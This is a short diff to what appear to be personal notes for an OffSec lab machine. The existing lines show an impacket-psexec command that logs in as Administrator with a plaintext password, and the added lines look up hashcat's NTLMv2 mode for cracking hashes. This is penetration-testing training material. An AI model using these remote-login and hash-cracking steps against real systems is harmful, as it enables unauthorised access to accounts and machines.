@@ -40,3 +40,7 @@ used to log in to the machine.
 ```
 impacket-psexec hutch.offsec/Administrator:'$az+c]64++F{$A'@192.168.105.122
 ```
+used to find hash number in hashcat:
+```
+hashcat -h | grep -i "ntlmv2"
+```
